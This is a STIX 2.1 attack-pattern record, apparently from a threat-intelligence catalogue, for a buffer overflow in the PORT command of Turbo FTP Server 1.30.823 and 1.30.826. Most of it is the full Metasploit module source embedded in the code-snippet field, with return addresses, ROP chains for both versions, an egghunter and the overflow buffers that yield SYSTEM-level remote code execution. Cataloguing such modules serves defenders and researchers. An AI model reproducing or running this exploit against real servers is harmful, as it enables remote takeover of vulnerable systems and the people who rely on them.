{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3a45245d-f9c8-4913-a45d-ac20fa42ccbc",
    "created": "2024-08-14T16:51:12.858212Z",
    "modified": "2024-08-14T16:51:12.858216Z",
    "name": "Turbo FTP Server 1.30.823 PORT Overflow",
    "description": " This module exploits a buffer overflow vulnerability found in the PORT command in Turbo FTP Server 1.30.823 & 1.30.826, which results in remote code execution under the context of SYSTEM. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/turboftp_port.rb",
            "external_id": "turboftp_port.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Turbo FTP Server 1.30.823 PORT Overflow',\n      'Description'    => %q{\n        This module exploits a buffer overflow vulnerability found in the PORT\n        command in Turbo FTP Server 1.30.823 & 1.30.826, which results in remote\n        code execution under the context of SYSTEM.\n      },\n      'Author'         =>\n        [\n          'Zhao Liang',    #Initial Discovery\n          'Lincoln',       #Metasploit\n          'corelanc0d3r',  #Metasploit\n          'thelightcosine' #Metasploit\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => [ 'win' ],\n      'References'     =>\n        [\n          [ 'EDB', '22161' ],\n          [ 'OSVDB', '85887' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars'       => \"\\x00\\x0a\\x0d\\x20\",\n          },\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          ['Windows Universal TurboFtp 1.30.823',\n            {\n              'Ret' => 0x00411985, # RETN (ROP NOP) [tbssvc.exe]\n              'ver' => 823\n            },\n\n          ],\n          [ 'Windows Universal TurboFtp 1.30.826',\n            {\n              'Ret' => 0x004fb207, # RETN (ROP NOP) [tbssvc.exe]\n              'ver' => 826\n            },\n          ],\n        ],\n\n      'DisclosureDate' => '2012-10-03',\n      'DefaultTarget'  => 0))\n  end\n\n  def check\n    connect\n    disconnect\n    if (banner =~ /1\\.30\\.823/)\n      return Exploit::CheckCode::Appears\n    elsif (banner =~ /1\\.30\\.826/)\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def create_rop_chain(ver)\n    # rop chain generated with mona.py - www.corelan.be\n    if ver == 823\n      rop_gadgets =\n      [\n        0x004b692a,\t# POP ECX # RETN [tbssvc.exe]\n        0x005f6074,\t# ptr to &VirtualAlloc() [IAT tbssvc.exe]\n        0x0046f82a,\t# MOV EDX,DWORD PTR DS:[ECX] # SUB EAX,EDX # RETN [tbssvc.exe]\n        0x00423b95,\t# XCHG EDX,EDI # RETN [tbssvc.exe]\n        0x00423a27,\t# XCHG ESI,EDI # RETN [tbssvc.exe]\n        0x005d1c99,\t# POP EBP # RETN [tbssvc.exe]\n        0x004cad5d,\t# & jmp esp [tbssvc.exe]\n        0x004ab16b,\t# POP EBX # RETN [tbssvc.exe]\n        0x00000001,\t# 0x00000001-> ebx\n        0x005ef7f6,\t# POP EDX # RETN [tbssvc.exe]\n        0x00001000,\t# 0x00001000-> edx\n        0x005d7139,\t# POP ECX # RETN [tbssvc.exe]\n        0x00000040,\t# 0x00000040-> ecx\n        0x004df1e0,\t# POP EDI # RETN [tbssvc.exe]\n        0x00411985,\t# RETN (ROP NOP) [tbssvc.exe]\n        0x00502639,\t# POP EAX # RETN [tbssvc.exe]\n        0x90909090,\t# nop\n        0x00468198,\t# PUSHAD # RETN [tbssvc.exe]\n      ].flatten.pack(\"V*\")\n\n    elsif ver == 826\n      rop_gadgets =\n      [\n        0x0050eae4,\t# POP ECX # RETN [tbssvc.exe]\n        0x005f7074,\t# ptr to &VirtualAlloc() [IAT tbssvc.exe]\n        0x004aa7aa,\t# MOV EDX,DWORD PTR DS:[ECX] # SUB EAX,EDX # RETN [tbssvc.exe]\n        0x00496A65,\t# XOR EAX,EAX [tbssvc.exe]\n        0x004badda,\t# ADD EAX,EDX # RETN [tbssvc.exe]\n        0x00411867,\t# XCHG EAX,ESI # XOR EAX,EAX # POP EBX # RETN [tbssvc.exe]\n        0x00000001,\t# 0x00000001-> ebx\n        0x0058a27a,\t# POP EBP # RETN [tbssvc.exe]\n        0x004df7dd,\t# & call esp [tbssvc.exe]\n        0x005f07f6,\t# POP EDX # RETN [tbssvc.exe]\n        0x00001000,\t# 0x00001000-> edx\n        0x004adc08,\t# POP ECX # RETN [tbssvc.exe]\n        0x00000040,\t# 0x00000040-> ecx\n        0x00465fbe,\t# POP EDI # RETN [tbssvc.exe]\n        0x004fb207,\t# RETN (ROP NOP) [tbssvc.exe]\n        0x00465f36,\t# POP EAX # RETN [tbssvc.exe]\n        0x90909090,\t# nop\n        0x004687ff,\t# PUSHAD # RETN [tbssvc.exe]\n      ].flatten.pack(\"V*\")\n    end\n    return rop_gadgets\n\n  end\n\n  def exploit\n    my_target = target\n    if my_target.name == 'Automatic'\n      print_status(\"Automatically detecting the target\")\n      connect\n      disconnect\n\n      if (banner =~ /1\\.30\\.823/)\n        my_target = targets[1]\n      elsif (banner =~ /1\\.30\\.826/)\n        my_target = targets[2]\n      end\n      if (not my_target)\n        print_status(\"No matching target...quiting\")\n        return\n      end\n      target = my_target\n    end\n\n    print_status(\"Selected Target: #{my_target.name}\")\n    c = connect_login\n    return if not c\n\n    rop_chain = create_rop_chain(target['ver'])\n    rop = rop_chain.unpack('C*').join(',')\n\n    eggoptions =\n      {\n        :checksum => true,\n        :eggtag => 'w00t',\n        :depmethod => 'virtualalloc',\n        :depreg => 'esi'\n      }\n\n    badchars = \"\\x00\"\n    hunter,egg = generate_egghunter(payload.encoded, badchars, eggoptions)\n\n    speedupasm = \"mov edx,eax\\n\"\n    speedupasm << \"sub edx,0x1000\\n\"\n    speedupasm << \"sub esp,0x1000\"\n    speedup = Metasm::Shellcode.assemble(Metasm::Ia32.new, speedupasm).encode_string\n\n    fasterhunter = speedup\n    fasterhunter << hunter\n\n    print_status(\"Connecting to target #{target.name} server\")\n\n    buf1 = rand_text_alpha(2012)\n    buf1 << egg\n    buf1 << rand_text_alpha(100)\n\n    buf2 = rand_text_alpha(4).unpack('C*').join(',')\n    buf2 << \",\"\n    buf2 << [target['Ret']].pack(\"V\").unpack('C*').join(',') #eip\n    buf2 << \",\"\n    buf2 << rop\n    buf2 << \",\"\n    buf2 << fasterhunter.unpack('C*').join(',')\n    buf2 << \",\"\n    buf2 << rand_text_alpha(90).unpack('C*').join(',')\n\n    send_cmd( ['CWD', buf1], true );\n    send_cmd( ['PORT', buf2], true );\n\n    print_status(\"Egghunter deployed, locating shellcode\")\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-10-03",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}